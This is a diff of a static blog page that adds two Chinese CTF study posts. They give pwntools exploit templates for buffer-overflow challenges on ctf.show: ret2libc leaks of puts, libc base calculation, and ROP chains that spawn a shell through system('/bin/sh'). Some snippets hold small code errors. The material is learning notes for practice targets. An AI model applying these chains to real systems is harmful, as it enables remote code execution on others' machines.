@@ -69,6 +69,100 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-第一周pwn2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/19/%E7%AC%AC%E4%B8%80%E5%91%A8pwn2/" class="article-date">
+  <time class="dt-published" datetime="2025-01-19T13:03:01.000Z" itemprop="datePublished">2025-01-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/19/%E7%AC%AC%E4%B8%80%E5%91%A8pwn2/">第一周pwn2</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>1，payload &#x3D; b’a’*(0xA+8) + p64(pop_rdi) + p64(bin_sh)  + p64(ret) + p64(system)<br>2，无binsh时sh也可代替<br>3，有system无binsh时可以选择写入binsh，用gdb调试来查看可读可写的参数。来利用写入函数来改写参数的值，即<br>payload &#x3D; b’a’*offset + p32(gets_addr) + p32(system_addr) + p32(buf2_addr) + p32(buf2_addr)<br>p.sendline(payload)<br>p.sendline(“&#x2F;bin&#x2F;sh”)<br>4，这是64位完整的exp<br>from pwn import *</p>
+<p>padding &#x3D; 0xA + 8</p>
+<p>io &#x3D; remote(“pwn.challenge.ctf.show”,28294)</p>
+<p>system &#x3D; 0x400520</p>
+<p>gets &#x3D; 0x400530</p>
+<p>binsh &#x3D; 0x603000 - 16</p>
+<p>rdi &#x3D; 0x4007f3<br>ret &#x3D; 0x4004fe<br>payload &#x3D; b’a’*padding<br>payload +&#x3D; p64(rdi)<br>payload +&#x3D; p64(binsh)<br>payload +&#x3D; p64(ret)<br>payload +&#x3D; p64(gets)<br>payload +&#x3D; p64(rdi)<br>payload +&#x3D; p64(binsh)<br>payload +&#x3D; p64(ret)<br>payload +&#x3D; p64(system)<br>io.recv()<br>io.sendline(payload)<br>io.sendline(“&#x2F;bin&#x2F;sh”)</p>
+<p>io.interactive()<br>照着这个格式来写就行。中间的binsh的位置要要用gdb来找，然后输入vmmap找本地的可读可写的参数就行了再减16.</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/19/%E7%AC%AC%E4%B8%80%E5%91%A8pwn2/" data-id="cm63mr0060004ok4ke3mqdf85" data-title="第一周pwn2" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-第一周pwn1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/19/%E7%AC%AC%E4%B8%80%E5%91%A8pwn1/" class="article-date">
+  <time class="dt-published" datetime="2025-01-19T13:00:09.000Z" itemprop="datePublished">2025-01-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/19/%E7%AC%AC%E4%B8%80%E5%91%A8pwn1/">第一周pwn1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>1，找数据发送节点；<br>2，找plt表。直接去plt.sec区去找。<br>3，找libc表，这个要注意到底got表是哪个函数（这个和后面输出的地址有关），再去查。real_addr &#x3D; u64(p.recvuntil(‘\x7f’)[-6:].ljust(8, b’\x00’))根据这个都后三位来查。<br>4，构造输入payload，一般是两个。<br>5.32位的libc地址<br>exp的例子，具体可以套。<br>from pwn import *</p>
+<p>padding &#x3D; 0x6B + 4<br>elf &#x3D; ELF(“.&#x2F;pwn”)<br>io &#x3D; remote(“pwn.challenge.ctf.show”,28139)<br>puts_plt &#x3D; elf.plt[‘puts’]<br>libc &#x3D; ELF[“.&#x2F;libc6_2.40-4ubuntu1_i386.so”]<br>puts_got &#x3D; elf.got[‘puts’]</p>
+<p>main &#x3D; 0x804866D</p>
+<p>payload &#x3D; b’a’*padding + p32(puts_plt) + p32(main)  + p32(puts_got)</p>
+<p>puts_real_addr &#x3D; u32(io.recv()[0:4])<br>print(hex(puts_real_addr))</p>
+<p>6，64位找libc地址<br>from pwn import *</p>
+<p>padding &#x3D; 0x70 + 8<br>io &#x3D; remote(“pwn.challenge.ctf.show”,28283)</p>
+<p>elf &#x3D; ELF(“.&#x2F;pwn”)<br>rdi &#x3D; 0x400803<br>puts_plt &#x3D; elf.plt[“puts”]<br>puts_got &#x3D; elf.got[“puts”]<br>main &#x3D; 0x40071D</p>
+<p>payload &#x3D; b’a’*padding + p64(rdi) + p64(puts_got) +  p64(puts_plt) + p64(main)<br>io.sendline(payload)<br>real_addr &#x3D; u64(io.recvuntil(‘\x7f’)[-6:].ljust(8, b’\x00’))<br>print(hex(real_addr))<br>注意：’main’是参数输入的函数若是输入的参数再run函数中那就将齐地址放到后面。<br>之后的就是这样了<br>libc_base&#x3D;puts_real-libc.dump(‘puts’)<br>bin_sh&#x3D;libc_base+libc.dump(‘str_bin_sh’)<br>sys_addr&#x3D;libc_base+libc.dump(‘system’)</p>
+<p>payload &#x3D; pad + p64(ret_addr)+ p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)<br>p.sendline(payload)<br>p.interactive()<br>7，32位和64位的最大不同就在于是否用寄存器传参。<br>8，</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/19/%E7%AC%AC%E4%B8%80%E5%91%A8pwn1/" data-id="cm63mr0040003ok4k3yg49zkl" data-title="第一周pwn1" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-我的第一个博客文章" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/01/14/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/" class="article-date">
@@ -96,7 +190,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/14/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/" data-id="cm5wc8jyi0002i04k2uee4g7c" data-title="我的第一个博客文章" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/14/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/" data-id="cm63mqzzt0001ok4k0dht4ap6" data-title="我的第一个博客文章" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -147,7 +241,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/13/hello-world/" data-id="cm5wc8jyf0001i04k59jaamn7" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/13/hello-world/" data-id="cm63mr0000002ok4kbr33d5d4" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -188,6 +282,14 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2025/01/19/%E7%AC%AC%E4%B8%80%E5%91%A8pwn2/">第一周pwn2</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/19/%E7%AC%AC%E4%B8%80%E5%91%A8pwn1/">第一周pwn1</a>
+          </li>
         
           <li>
             <a href="/2025/01/14/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/">我的第一个博客文章</a>
